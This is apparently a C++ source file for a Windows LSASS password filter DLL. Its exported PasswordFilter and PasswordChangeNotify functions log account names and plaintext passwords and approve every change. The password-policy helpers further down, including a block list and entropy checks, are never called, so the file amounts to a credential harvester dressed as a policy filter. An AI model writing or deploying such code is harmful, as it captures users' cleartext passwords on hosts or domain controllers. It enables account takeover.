#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_ // prevent winsock.h inclusion
#include <windows.h>
#include <sddl.h>
#include <winternl.h>
#include "../common/Logger.h"

static void LogUnicode(const char* label, PUNICODE_STRING str)
{
    if (!str || !str->Buffer) return;

    int size = WideCharToMultiByte(
        CP_UTF8, 0,
        str->Buffer, str->Length / 2,
        NULL, 0, NULL, NULL);

    std::string out(size, 0);

    WideCharToMultiByte(
        CP_UTF8, 0,
        str->Buffer, str->Length / 2,
        &out[0], size, NULL, NULL);

    LogEvent(std::string(label) + ": " + out);
}

extern "C" __declspec(dllexport)
BOOLEAN InitializeChangeNotify(void)
{
    LogEvent("[PasswordFilter] Initialized in LSASS");
    return TRUE;
}

extern "C" __declspec(dllexport)
BOOLEAN PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation
)
{
    LogEvent("[PasswordFilter] PasswordFilter triggered");

    LogUnicode("AccountName", AccountName);
    LogUnicode("FullName", FullName);
    LogUnicode("Password", Password);

    LogEvent(std::string("Operation: ") +
        (SetOperation ? "SET_PASSWORD" : "VALIDATE_PASSWORD"));

    LogEvent("[PasswordFilter] Decision: ALLOW");

    return TRUE;
}

extern "C" __declspec(dllexport)
NTSTATUS PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword
)
{
    LogEvent("[PasswordFilter] PasswordChangeNotify");
    LogUnicode("Username", UserName);
    LogUnicode("New Password", NewPassword);

    return 0;
}

struct PasswordPolicyResult
{
    bool allowed;
    int score;
    const wchar_t* reason;
};

bool CheckLength(const wchar_t* pwd)
{
    size_t len = wcslen(pwd);
    return len >= 12 && len <= 128;
}

// Check character diversity
int CharacterClasses(const wchar_t* pwd)
{
    bool lower = false, upper = false, digit = false, special = false;

    for (size_t i = 0; pwd[i]; i++)
    {
        if (iswlower(pwd[i])) lower = true;
        else if (iswupper(pwd[i])) upper = true;
        else if (iswdigit(pwd[i])) digit = true;
        else special = true;
    }

    return lower + upper + digit + special;
}

// Block list matching
bool IsBlocked(const wchar_t* pwd)
{
    const wchar_t* blacklist[] = {
        L"password",
        L"123456",
        L"admin",
        L"welcome"
    };

    for (auto word : blacklist)
    {
        if (wcsstr(pwd, word)) return true;
    }

    return false;
}

// Calculate Entropy
double CalculateEntropy(const wchar_t* pwd)
{
    int freq[256] = {0};
    int len = wcslen(pwd);

    for (int i = 0; i < len; i++)
        freq[(unsigned char)pwd[i]]++;

    double entropy = 0.0;

    for (int i = 0; i < 256; i++)
    {
        if (freq[i] == 0) continue;

        double p = (double)freq[i] / len;
        entropy -= p * log2(p);
    }

    return entropy;
}

double EstimateCrackTime(double entropy)
{
    // rough model: 2^entropy guesses
    double guesses = pow(2, entropy);

    // assume 1e9 guesses/sec attacker
    double seconds = guesses / 1e9;

    return seconds;
}

// Policy decision
PasswordPolicyResult EvaluatePassword(const wchar_t* pwd)
{
    if (!CheckLength(pwd))
        return {false, 0, L"Length policy failure"};

    if (IsBlocked(pwd))
        return {false, 0, L"Blocked password"};

    double entropy = CalculateEntropy(pwd);

    if (entropy < 3.0)
        return {false, 20, L"Low entropy"};

    return {true, 80, L"Accepted"};
}